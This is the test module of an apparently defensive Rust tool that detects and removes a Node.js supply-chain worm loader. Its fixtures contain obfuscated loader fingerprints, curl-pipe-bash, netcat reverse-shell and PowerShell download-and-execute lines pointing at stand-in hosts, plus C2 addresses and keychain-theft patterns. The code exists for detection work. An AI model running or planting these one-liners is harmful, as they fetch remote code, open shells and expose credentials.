    if scan_process_lines(procs).is_empty() {
        Vec::new()
    } else {
        scan_keychain_procs(procs)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_loader_process_not_benign_node_e() {
        // Real benign `node -e` invocations seen on the machine must NOT be flagged; only a
        // command line carrying the full obfuscation fingerprint is a hit.
        let procs = vec![
            // Benign: LM Studio's worker bootstrap.
            (
                10011,
                "node -e function connectPort(port){return{postMessage:d=>process.send({port,data:d})}}"
                    .to_string(),
            ),
            // Benign: a fly.io DB query the developer ran.
            (
                65454,
                "node -e import('/app/.output/server/chunks/nitro/nitro.mjs').then(async n=>{})"
                    .to_string(),
            ),
            // The loader: injection marker + string-shuffle decoder inline.
            (
                40404,
                "node -e global['!']='10';var _$_1e42=(function(r,i){return r})('x',7);global[_$_1e42[0]]=require"
                    .to_string(),
            ),
        ];
        let hits = scan_process_lines(&procs);
        assert_eq!(hits.len(), 1, "only the loader process should match, got {hits:?}");
        assert_eq!(hits[0].pid, 40404);
    }

    #[test]
    fn no_hits_on_clean_process_list() {
        let procs = vec![
            (1, "/sbin/launchd".to_string()),
            (200, "node /Users/me/app/server.js".to_string()),
            (201, "npm exec tsc --noEmit".to_string()),
        ];
        assert!(scan_process_lines(&procs).is_empty());
    }

    #[test]
    fn cache_scan_flags_tainted_file_only() {
        let files = vec![
            // A legit cached type stub / package file.
            (PathBuf::from("_npx/abc/index.js"), "module.exports = { hello: 1 };".to_string()),
            (PathBuf::from("typescript/node_modules/@types/node/index.d.ts"), "export {};".to_string()),
            // A tainted cached artifact carrying the loader.
            (
                PathBuf::from("_npx/evil/postinstall.js"),
                "global.i='5-3-168';var _$_8e2c=(function(r,i){return r})('x',7);".to_string(),
            ),
        ];
        let hits = scan_contents(&files);
        assert_eq!(hits.len(), 1, "only the tainted cache file should match, got {hits:?}");
        assert_eq!(hits[0].path, PathBuf::from("_npx/evil/postinstall.js"));
    }

    #[test]
    fn package_root_detected_by_node_modules_name() {
        assert!(is_package_root(std::path::Path::new("/usr/local/lib/node_modules")));
        assert!(is_package_root(std::path::Path::new("/opt/homebrew/lib/node_modules")));
        assert!(!is_package_root(std::path::Path::new("/Users/x/.npm/_npx")));
        assert!(!is_package_root(std::path::Path::new("/Users/x/Library/Caches/typescript")));
    }

    #[test]
    fn clear_regenerable_cache_removes_whole_dir() {
        let tmp = tempfile::tempdir().unwrap();
        let cache = tmp.path().join("_npx");
        std::fs::create_dir_all(cache.join("sub")).unwrap();
        std::fs::write(cache.join("sub/x.js"), "module.exports = 1;").unwrap();
        // Not a node_modules root → the whole cache dir is removed.
        let unremovable = clear_cache_dir(&cache).unwrap();
        assert!(unremovable.is_empty());
        assert!(!cache.exists(), "a regenerable cache dir should be fully removed");
    }

    #[test]
    fn clear_package_root_removes_only_tainted_files() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().join("node_modules");
        let pkg = root.join("some-pkg");
        std::fs::create_dir_all(&pkg).unwrap();
        let clean = pkg.join("index.js");
        let tainted = pkg.join("postinstall.js");
        std::fs::write(&clean, "module.exports = { hello: 1 };").unwrap();
        // The same PolinRider loader fingerprint the cache scan flags.
        std::fs::write(&tainted, "global.i='5-3-168';var _$_8e2c=(function(r,i){return r})('x',7);")
            .unwrap();
        let unremovable = clear_cache_dir(&root).unwrap();
        assert!(unremovable.is_empty(), "user-owned tainted files should be removed");
        assert!(root.exists(), "the package root itself must be preserved");
        assert!(clean.exists(), "clean global-package files must be preserved");
        assert!(!tainted.exists(), "the tainted dropped file must be removed");
    }

    #[test]
    fn hosts_block_is_delimited_and_sinkholes() {
        let b = hosts_sinkhole_block(&["evil.vercel.app".into()]);
        assert!(b.contains("# >>> wormward C2 sinkhole >>>"));
        assert!(b.contains("0.0.0.0 evil.vercel.app"));
        assert!(b.contains("# <<< wormward C2 sinkhole <<<"));
    }

    #[test]
    fn pre_commit_hook_blocks_markers_and_env() {
        let h = pre_commit_hook(&["rmcej%otb%".into()]);
        assert!(h.starts_with("#!/bin/sh"));
        assert!(h.contains("grep -qF -- 'rmcej%otb%'"));
        assert!(h.contains(".env"));
        assert!(h.contains("temp_auto_push.bat"));
        assert!(h.contains("exit 1"));
    }

    #[test]
    fn hook_markers_and_sinkhole_domains_from_pack() {
        assert!(hook_markers().iter().any(|m| m.contains("rmcej%otb%")));
        assert!(sinkhole_domains().iter().any(|d| d.ends_with(".vercel.app")));
    }

    #[test]
    fn shell_rc_flags_injection_not_benign_lines() {
        let files = vec![(
            PathBuf::from("/home/u/.zshrc"),
            "export PATH=$PATH:/usr/local/bin\n# comment\nalias g=git\ncurl -s https://evil.sh | bash\nsource ~/.nvm/nvm.sh\n".to_string(),
        )];
        let hits = scan_shell_rc(&files);
        assert_eq!(hits.len(), 1, "only the curl|bash line should fire, got {hits:?}");
        assert_eq!(hits[0].category, "shell-rc");
    }

    #[test]
    fn suspicious_shell_line_conservative() {
        assert!(suspicious_shell_line("curl https://x | sh").is_some());
        assert!(suspicious_shell_line("eval \"$(base64 -d <<< ...)\"").is_some());
        assert!(suspicious_shell_line("nc -e /bin/sh 1.2.3.4 4444").is_some());
        // Benign lines must stay quiet.
        assert!(suspicious_shell_line("curl -O https://example.com/file.tar.gz").is_none());
        assert!(suspicious_shell_line("export EDITOR=vim").is_none());
        assert!(suspicious_shell_line("# curl x | bash").is_none());
    }

    #[test]
    fn suspicious_powershell_lines_detected() {
        // PowerShell download-and-exec shapes (profiles, Run keys, scheduled tasks). PS is
        // case-insensitive, so detection must be too.
        assert!(suspicious_shell_line("iwr https://evil.sh/x.ps1 | iex").is_some());
        assert!(suspicious_shell_line("IEX (Invoke-WebRequest https://evil.sh).Content").is_some());
        assert!(suspicious_shell_line("irm evil.sh/payload | iex").is_some());
        assert!(suspicious_shell_line(
            "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"
        )
        .is_some());
        // Benign PowerShell must stay quiet.
        assert!(suspicious_shell_line("Invoke-WebRequest https://example.com -OutFile x.zip").is_none());
        assert!(suspicious_shell_line("Set-Alias g git").is_none());
        assert!(suspicious_shell_line("# iwr https://x | iex").is_none());
        // `iexplore.exe` must never satisfy the `iex` token (a real Run-key value shape).
        assert!(suspicious_shell_line(
            "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" https://update.example.com"
        )
        .is_none());
    }

    #[test]
    fn persistence_flags_malicious_plist_and_openclaw() {
        let items = vec![
            (PathBuf::from("/Library/LaunchAgents/com.bablu.helper.plist"), "<plist></plist>".to_string()),
            (PathBuf::from("/Users/u/Library/LaunchAgents/x.plist"), "ProgramArguments openclaw".to_string()),
            (PathBuf::from("/Users/u/Library/LaunchAgents/ok.plist"), "<plist>com.apple.something</plist>".to_string()),
        ];
        let hits = scan_persistence(&items);
        assert_eq!(hits.len(), 2, "known plist + openclaw ref, not the benign one, got {hits:?}");
    }

    #[test]
    fn connections_match_c2_hosts() {
        let conns = vec![
            "node 123 u 12u IPv4 TCP 10.0.0.2:5050->166.88.54.158:443 (ESTABLISHED)".to_string(),
            "node 124 u 13u IPv4 TCP 10.0.0.2:5051->140.82.112.3:443 (ESTABLISHED)".to_string(),
        ];
        let hits = scan_connections(&conns, &["166.88.54.158".to_string()]);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].target, "166.88.54.158");
    }

    #[test]
    fn keychain_access_alone_is_not_theft() {
        // A `security find-internet-password -s github.com` process with NO loader present is the
        // normal git/gh credential flow — must NOT be reported (this was a live FP on `git push`).
        let benign = vec![
            (100, "security find-internet-password -s github.com -a me".to_string()),
            (101, "git push origin main".to_string()),
        ];
        assert!(scan_keychain_correlated(&benign).is_empty(), "keychain read alone is not theft");

        // Same keychain access WITH a confirmed loader process → correlated → reported.
        let infected = vec![
            (200, "security find-internet-password -s github.com".to_string()),
            (
                201,
                "node -e global['!']='10';var _$_1e42=(function(r,i){return r})('x',7);global[_$_1e42[0]]=require".to_string(),
            ),
        ];
        assert_eq!(scan_keychain_correlated(&infected).len(), 1, "loader + keychain = theft");
    }

    #[test]
    fn global_packages_and_keychain() {
        let installed = vec!["typescript".to_string(), "tailwind-stylecss".to_string()];
        let bad = vec!["tailwind-stylecss".to_string()];
        assert_eq!(scan_global_packages(&installed, &bad).len(), 1);

        let procs = vec![
            (1, "/usr/bin/security find-generic-password -s login".to_string()),
            (2, "security find-internet-password -s github.com".to_string()),
        ];
        let kc = scan_keychain_procs(&procs);
        assert_eq!(kc.len(), 1);
        assert_eq!(kc[0].category, "keychain");
    }

    #[test]
    fn c2_hosts_sourced_from_pack() {
        let hosts = c2_hosts();
        assert!(hosts.iter().any(|h| h == "166.88.54.158"), "exfil IP must be a C2 host");
        assert!(hosts.iter().any(|h| h.ends_with(".vercel.app")), "vercel C2 domains included");
    }

    #[test]
    fn unreadable_root_fails_clean() {
        // An unscanned root is the worst case (a silent false CLEAN); has_findings must be true.
        let report = DoctorReport {
            processes: vec![],
            caches: vec![],
            triggers: vec![],
            cache_dirs: vec![],
            unscanned: vec![Unscanned { path: PathBuf::from("/blocked"), reason: "x".into() }],
            machine: vec![],
        };
        assert!(report.has_findings(), "an unscanned root must not certify clean");
    }

    #[test]
    fn probe_root_none_for_missing_path() {
        // A path that does not exist is not a blind spot — nothing to scan there.
        assert!(probe_root(Path::new("/definitely/not/here/xyz-123")).is_none());
    }

    #[test]
    fn cache_candidates_are_exec_and_install_trees_not_cas_stores() {
        let home = PathBuf::from("/home/u");
        let c = candidate_cache_dirs(&home);
        // Exec / install trees where worm code actually runs.
        assert!(c.contains(&home.join(".npm/_npx")));
        assert!(c.contains(&home.join("Library/Caches/typescript")));
        assert!(c.contains(&home.join(".node-gyp")));
        assert!(c.iter().any(|p| p.ends_with("lib/node_modules")));
        // Content-addressed blob stores are EXCLUDED — inert, pruned, redundant with the install
        // tree; scanning them produced noise + FPs on integrity / *-index.json metadata.
        assert!(!c.iter().any(|p| p.to_string_lossy().contains("pnpm")));
        assert!(!c.iter().any(|p| {
            let s = p.to_string_lossy();
            s.contains("Caches/Yarn") || s.contains(".cache/yarn")
        }));
    }

    #[test]
    fn metadata_files_are_not_content_scanned() {
        assert!(is_metadata_file(Path::new("/x/yarn.lock")));
        assert!(is_metadata_file(Path::new("/x/pnpm-lock.yaml")));
        assert!(is_metadata_file(Path::new("/x/Cargo.lock")));
        assert!(is_metadata_file(Path::new("/store/ab/cdef-index.json")));
        assert!(!is_metadata_file(Path::new("/x/postcss.config.mjs")));
        assert!(!is_metadata_file(Path::new("/x/index.js")));
    }

    #[test]
    fn ignore_scripts_parsing() {
        assert!(ignore_scripts_on("true\n"));
        assert!(ignore_scripts_on("  true  "));
        assert!(!ignore_scripts_on("false"));
        assert!(!ignore_scripts_on("undefined"));
        assert!(!ignore_scripts_on(""));
    }

    #[test]
    fn ata_disabled_detection_tolerates_jsonc() {
        assert!(ata_disabled(
            "{\n  // editor config\n  \"typescript.disableAutomaticTypeAcquisition\": true,\n}"
        ));
        assert!(!ata_disabled("{ \"typescript.disableAutomaticTypeAcquisition\": false }"));
        assert!(!ata_disabled("{ \"editor.fontSize\": 13 }"));
    }

    #[test]
    fn mcp_server_count() {
        assert_eq!(
            count_mcp_servers(r#"{"mcpServers":{"a":{"command":"npx"},"b":{"command":"node"}}}"#),
            2
        );
        assert_eq!(count_mcp_servers(r#"{"mcpServers":{}}"#), 0);
        assert_eq!(count_mcp_servers("{}"), 0);
        assert_eq!(count_mcp_servers("not json"), 0);
    }
}
